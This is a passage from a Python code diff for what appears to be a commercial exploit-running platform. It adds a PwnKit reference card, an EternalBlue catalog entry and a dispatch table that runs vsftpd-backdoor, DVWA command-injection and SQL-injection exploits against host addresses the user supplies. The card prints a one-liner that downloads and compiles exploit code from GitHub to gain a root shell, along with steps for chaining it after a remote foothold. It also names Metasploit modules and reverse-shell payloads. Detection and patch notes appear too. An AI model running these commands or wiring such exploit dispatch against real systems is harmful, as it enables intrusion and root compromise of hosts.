+                "infrastructure only — ~10% BSOD risk). For a non-destructive confirm, "
+                "use the auxiliary scanner module shown above.")}
+
+
+async def exploit_pwnkit_cve_2021_4034(target: str, port: int, sid: str) -> dict:
+    """CVE-2021-4034 / PwnKit — local privilege escalation in polkit's
+    pkexec. Affects polkit < 0.120 (effectively every default Linux
+    install before late January 2022).
+
+    This is a LOCAL privesc — there is no remote attack surface. We
+    accept the catalog dispatch interface for consistency and surface
+    a reference card: how to check if vulnerable, where to get the
+    exploit, and how to patch. Customers pair this with a remote
+    foothold exploit (e.g. dvwa_cmdi_low) to chain remote-shell →
+    root."""
+    lines = ["=== PwnKit CVE-2021-4034 — Reference Card ==="]
+    lines.append(f"Target (informational): {target}")
+    lines.append(f"CVSS:                   7.8 (HIGH)")
+    lines.append(f"Discovered:             January 2022 — Qualys")
+    lines.append(f"Affected:               polkit ≤ 0.119 (all major distros pre-Jan-2022)")
+    lines.append("")
+    lines.append("HOW IT WORKS:")
+    lines.append("  pkexec is setuid-root. When invoked with argv[0] = NULL")
+    lines.append("  (achievable via execve), pkexec reads its 'argv[0]' from a")
+    lines.append("  user-controlled OUT-OF-BOUNDS array index. By aligning the")
+    lines.append("  environment carefully, the attacker controls argv[0], which")
+    lines.append("  pkexec passes to setenv() → arbitrary env-var injection in")
+    lines.append("  a setuid context → load of a controlled shared library as root.")
+    lines.append("")
+    lines.append("CHECK IF TARGET IS VULNERABLE (on the foothold shell):")
+    lines.append("  pkexec --version")
+    lines.append("  # polkit-0.105 to 0.119 → VULNERABLE")
+    lines.append("  # polkit-0.120 or later → patched")
+    lines.append("")
+    lines.append("EXPLOIT (single-command C variant — run as low-priv user):")
+    lines.append("  cd /tmp && \\")
+    lines.append("  curl -sL https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c -o pwn.c && \\")
+    lines.append("  curl -sL https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/Makefile  -o Makefile && \\")
+    lines.append("  make && \\")
+    lines.append("  ./cve-2021-4034")
+    lines.append("  # → root shell")
+    lines.append("")
+    lines.append("EXPLOIT (pure-Python single-file PoC):")
+    lines.append("  https://github.com/joeammond/CVE-2021-4034")
+    lines.append("")
+    lines.append("CHAIN IT WITH:")
+    lines.append("  1. Get a remote shell via dvwa_cmdi_low / vsftpd_234_backdoor / etc.")
+    lines.append("  2. Use the live shell tab to run the curl-make-execute one-liner.")
+    lines.append("  3. Hit root within 5 seconds on a vulnerable host.")
+    lines.append("")
+    lines.append("DETECTION (Blue Team):")
+    lines.append("  Watch auditd for pkexec invocations with empty argv:")
+    lines.append("  -a always,exit -F arch=b64 -S execve -F exe=/usr/bin/pkexec")
+    lines.append("")
+    lines.append("REMEDIATION:")
+    lines.append("  Ubuntu/Debian:  apt update && apt install --only-upgrade policykit-1")
+    lines.append("  RHEL/CentOS:    yum update polkit")
+    lines.append("  Workaround:     chmod 0755 /usr/bin/pkexec   (removes setuid bit)")
+
+    shell = ExploitShell(sid, target, 0, "pwnkit_cve_2021_4034")
+    shell.status = "live"
+    shell.append("\n".join(lines) + "\n")
+    EXPLOIT_SHELLS[sid] = shell
+    return {"ok": True,
+            "shell_id": sid,
+            "cve": "CVE-2021-4034",
+            "kind": "reference",
+            "evidence": ("Reference card surfaced. PwnKit is a LOCAL privesc — pair this "
+                         "with a remote foothold (e.g. dvwa_cmdi_low) and run the exploit "
+                         "on the target."),
+            "suggested_action": (
+                "First obtain a remote shell via another exploit, then run the one-line "
+                "curl|make|exec command from the report inside that shell.")}
+
+
 # ── Catalog: VERIFIED-WORKING exploits the customer can try ──
 EXPLOIT_CATALOG = [
     {
@@ -4897,6 +5369,46 @@ EXPLOIT_CATALOG = [
         "lhost_needed": False,
         "lport_needed": False,
     },
+    {
+        "id":           "eternalblue_ms17_010",
+        "name":         "EternalBlue MS17-010 — SMBv1 Detection",
+        "cve":          "CVE-2017-0144",
+        "cvss":         8.1,
+        "target":       "",   # customer-supplied: bundled lab has no Windows host
+        "port":         445,
+        "service":      "Windows SMB",
+        "category":     "Remote Code Execution (Windows)",
+        "description":  "Probes the target's SMB stack on port 445. If SMBv1 is enabled, the host is almost certainly vulnerable to MS17-010 (the NSA-leaked exploit used in WannaCry). We DETECT only — the full kernel-pool corruption primitive has a ~10% BSOD rate on vulnerable hosts, so we leave the actual fire-button to msfconsole on infrastructure the customer has authorization to crash.",
+        "result":       "Vulnerability verdict + Metasploit one-liner",
+        "difficulty":   "Easy",
+        "interactive":  False,
+        "msf_module":   "exploit/windows/smb/ms17_010_eternalblue",
+        "msf_payload":  "windows/x64/meterpreter/reverse_tcp",
+        "format":       "data",
+        "search_query": "MS17-010 EternalBlue SMBv1",
+        "lhost_needed": False,
+        "lport_needed": False,
+    },
+    {
+        "id":           "pwnkit_cve_2021_4034",
+        "name":         "PwnKit CVE-2021-4034 — Local Privesc Reference",
+        "cve":          "CVE-2021-4034",
+        "cvss":         7.8,
+        "target":       "",   # informational only
+        "port":         0,
+        "service":      "Linux polkit / pkexec",
+        "category":     "Local Privilege Escalation (Linux)",
+        "description":  "Reference card for the polkit pkexec local privilege escalation (Qualys, Jan 2022). Affects polkit ≤ 0.119 — virtually every default Linux install before late January 2022. This is a LOCAL primitive: chain it with a remote-shell exploit (e.g. dvwa_cmdi_low) to escalate www-data → root.",
+        "result":       "Exploit script + check command + remediation",
+        "difficulty":   "Trivial",
+        "interactive":  False,
+        "msf_module":   "exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec",
+        "msf_payload":  "linux/x64/shell/reverse_tcp",
+        "format":       "data",
+        "search_query": "PwnKit pkexec CVE-2021-4034",
+        "lhost_needed": False,
+        "lport_needed": False,
+    },
 ]
 
 
@@ -4941,16 +5453,70 @@ class ExploitRunRequest(BaseModel):
     port: Optional[int] = None   # optional override — port for the external target
 
 
+# Dispatch table: exploit_id → handler coroutine. Each handler accepts
+# (spec, target, port, sid) and returns a result dict. Adding a new exploit
+# is a 2-line change here + one implementation function. No more editing
+# the if/elif ladder inside the request handler.
+
+async def _h_vsftpd_234(spec, target, port, sid):
+    return await exploit_vsftpd_234(target, sid)
+
+async def _h_dvwa_cmdi(spec, target, port, sid):
+    lhost, lport = _xpl_lhost_for(target)
+    return await exploit_dvwa_cmdi(target, port, sid, lhost, lport)
+
+async def _h_dvwa_sqli(spec, target, port, sid):
+    return await exploit_dvwa_sqli(target, port, sid)
+
+async def _h_juiceshop_admin(spec, target, port, sid):
+    return await exploit_juiceshop_admin(target, port, sid)
+
+async def _h_bwapp_sqli(spec, target, port, sid):
+    return await exploit_bwapp_sqli(target, port, sid)
+
+async def _h_eternalblue(spec, target, port, sid):
+    return await exploit_eternalblue_ms17_010(target, port, sid)
+
+async def _h_pwnkit(spec, target, port, sid):
+    return await exploit_pwnkit_cve_2021_4034(target, port, sid)
+
+EXPLOIT_HANDLERS: dict = {
+    "vsftpd_234_backdoor":   _h_vsftpd_234,
+    "dvwa_cmdi_low":         _h_dvwa_cmdi,
+    "dvwa_sqli_low":         _h_dvwa_sqli,
+    "juiceshop_admin_sqli":  _h_juiceshop_admin,
+    "bwapp_sqli_low":        _h_bwapp_sqli,
+    "eternalblue_ms17_010":  _h_eternalblue,
+    "pwnkit_cve_2021_4034":  _h_pwnkit,
+}
+
+
 @app.post("/api/exploit/run")
 async def exploit_run(req: ExploitRunRequest, user=Depends(verify_token)):
     """Run one exploit from the catalog. Returns immediately with a shell_id
     that the frontend uses to poll terminal output. If req.target / req.port
     are provided, the exploit runs against THAT host instead of the bundled
     lab container — letting customers point our exploits at their own
-    vulnerable services. Otherwise the catalog default is used."""
+    vulnerable services. Otherwise the catalog default is used.
+
+    Customer-experience robustness:
+      • Pre-flight retries 3× before declaring the lab unreachable (cold-
+        start containers need a few seconds).
+      • A per-exploit-id asyncio.Lock serializes concurrent customers so
+        a single-use primitive (vsftpd backdoor's port 6200, DVWA shared
+        cookies) doesn't race itself.
+      • The session sweeper is started lazily on the first /run so
+        orphaned shells get closed after 30 min idle.
+      • Every failure path returns a `suggested_action` field the
+        frontend renders as a yellow "what to try" callout.
+    """
+    _xpl_ensure_sweeper()
+
     spec = next((e for e in EXPLOIT_CATALOG if e["id"] == req.exploit_id), None)
     if not spec:
-        return {"ok": False, "error": f"Unknown exploit id: {req.exploit_id}"}
+        return {"ok": False,
+                "error": f"Unknown exploit id: {req.exploit_id}",
+                "suggested_action": "Refresh the page — the catalog may have changed."}
 
     # Customer override takes precedence over the catalog default. Strip out
     # any scheme prefix (http://) the user may paste from a browser URL.
@@ -4974,33 +5540,75 @@ async def exploit_run(req: ExploitRunRequest, user=Depends(verify_token)):
     port   = req_port  if req_port      else spec["port"]
     sid    = f"exp_{spec['id']}_{uuid.uuid4().hex[:8]}"
 
-    # Pre-flight — is the lab container reachable?
-    try:
-        ip = _xpl_socket.gethostbyname(target)
-    except Exception:
+    # Catalog entries with `port == 0` are reference-only exploits (e.g. PwnKit
+    # which is local privesc — there is no remote service to probe). Skip the
+    # whole pre-flight for those.
+    skip_preflight = (port == 0)
+
+    # Catalog entries with empty `target` require the customer to supply one
+    # (e.g. EternalBlue — the bundled lab has no Windows host).
+    if not target and not skip_preflight:
         return {"ok": False,
-                "error": f"Target '{target}' does not resolve. Run `docker compose up -d` on the VPS to start the lab containers.",
-                "exploit_id": spec["id"]}
-    if not _xpl_port_open(target, port, timeout=4):
-        return {"ok": False,
-                "error": f"{target}:{port} is not accepting connections. Service may still be starting.",
+                "error": f"This exploit has no bundled lab target — enter the IP/host you want to scan.",
+                "suggested_action": (
+                    "Type a target IP or hostname into the 'Target IP / Host' "
+                    "field (e.g. a Windows VM you own and have authorization "
+                    "to test) and click AUTO-RUN again."),
                 "exploit_id": spec["id"]}
 
-    # Dispatch — every exploit now accepts the resolved (target, port) so a
-    # customer override propagates to the URL/socket the exploit actually opens.
-    if   spec["id"] == "vsftpd_234_backdoor":
-        result = await exploit_vsftpd_234(target, sid)
-    elif spec["id"] == "dvwa_cmdi_low":
-        lhost, lport = _xpl_lhost_for(target)
-        result = await exploit_dvwa_cmdi(target, port, sid, lhost, lport)
-    elif spec["id"] == "dvwa_sqli_low":
-        result = await exploit_dvwa_sqli(target, port, sid)
-    elif spec["id"] == "juiceshop_admin_sqli":
-        result = await exploit_juiceshop_admin(target, port, sid)
-    elif spec["id"] == "bwapp_sqli_low":
-        result = await exploit_bwapp_sqli(target, port, sid)
-    else:
-        return {"ok": False, "error": f"Exploit {spec['id']} has no implementation"}
+    if not skip_preflight:
+        # Pre-flight — DNS resolution
+        try:
+            _xpl_socket.gethostbyname(target)
+        except Exception:
+            return {"ok": False,
+                    "error": f"Target '{target}' does not resolve.",
+                    "suggested_action": (
+                        "If this is a bundled lab target, run "
+                        "`docker compose up -d` on the VPS. If it's your own "
+                        "host, double-check spelling and that DNS is working."),
+                    "exploit_id": spec["id"]}
+
+        # Pre-flight — port reachability with retry (cold-start labs need a moment)
+        port_ok = False
+        for attempt in range(3):
+            if _xpl_port_open(target, port, timeout=4):
+                port_ok = True
+                break
+            if attempt < 2:
+                await asyncio.sleep(3)
+        if not port_ok:
+            return {"ok": False,
+                    "error": (f"{target}:{port} is not accepting connections "
+                              f"after 3 attempts (~12 s)."),
+                    "suggested_action": (
+                        "The service may still be starting. Wait 60 seconds and "
+                        "try again. If it keeps failing, the container may be "
+                        "stuck — `docker compose restart` will fix it."),
+                    "exploit_id": spec["id"]}
+
+    # Dispatch — serialized per-exploit-id so concurrent customers can't race
+    # the single-use primitives. Distinct exploits still run in parallel.
+    handler = EXPLOIT_HANDLERS.get(spec["id"])
+    if handler is None:
+        return {"ok": False,
+                "error": f"Exploit '{spec['id']}' has no implementation",
+                "suggested_action": (
+                    "This catalog entry is missing a handler. Pick another "
+                    "exploit from the list; this one will be fixed in the "
+                    "next deploy."),
+                "exploit_id": spec["id"]}
+
+    async with _xpl_get_lock(spec["id"]):
+        try:
+            result = await handler(spec, target, port, sid)
+        except Exception as e:
+            result = {"ok": False,
+                      "error": f"Unhandled exception: {e}",
+                      "suggested_action": (
+                          "This is a bug on our side. Try a different exploit "
+                          "and contact support@vulnuslab.com with the time of "
+                          "this attempt.")}
 
     # Save scan record (for history + report)
     try:
@@ -5018,8 +5626,10 @@ async def exploit_run(req: ExploitRunRequest, user=Depends(verify_token)):
 
 @app.get("/api/exploit/shell/{sid}/output")
 async def exploit_shell_output_v2(sid: str, user=Depends(verify_token)):
-    s = EXPLOIT_SHELLS.get(sid)
+    s = _xpl_get_session_for_user(sid)
     if not s:
+        # Cover both "session doesn't exist" and "belongs to another user" —
+        # don't leak the difference to potential ID-enumerators.
         return {"output": "", "status": "not_found"}
     return {"output": s.drain(), "status": s.status, "error": s.error}
 
@@ -5030,7 +5640,7 @@ class ExploitCmdRequest(BaseModel):
 @app.post("/api/exploit/shell/{sid}/cmd")
 async def exploit_shell_cmd_v2(sid: str, body: ExploitCmdRequest,
                                  user=Depends(verify_token)):
-    s = EXPLOIT_SHELLS.get(sid)
+    s = _xpl_get_session_for_user(sid)
     if not s:
         return {"ok": False, "error": "Shell not found"}
     if s.status != "live":
@@ -5043,6 +5653,7 @@ async def exploit_shell_cmd_v2(sid: str, body: ExploitCmdRequest,
     if not s.writer:
         return {"ok": False, "error": "Shell has no writer (socket closed?)"}
     try:
+        s.last_touched = _time.time()
         s.writer.write((body.cmd + "\n").encode())
         await s.writer.drain()
         return {"ok": True}
@@ -5053,15 +5664,19 @@ async def exploit_shell_cmd_v2(sid: str, body: ExploitCmdRequest,
 
 @app.post("/api/exploit/shell/{sid}/close")
 async def exploit_shell_close_v2(sid: str, user=Depends(verify_token)):
-    s = EXPLOIT_SHELLS.pop(sid, None)
+    # ACL: only the owner may close their own session.
+    s = _xpl_get_session_for_user(sid)
     if s is None:
         return {"ok": True}
+    EXPLOIT_SHELLS.pop(sid, None)
     if isinstance(s, WebShellSession):
-        s.close_session()
+        try: s.close_session()
+        except Exception: pass
         return {"ok": True}
     if s.writer:
         try: s.writer.close()
         except Exception: pass
+    s.status = "closed"
     return {"ok": True}
 
 
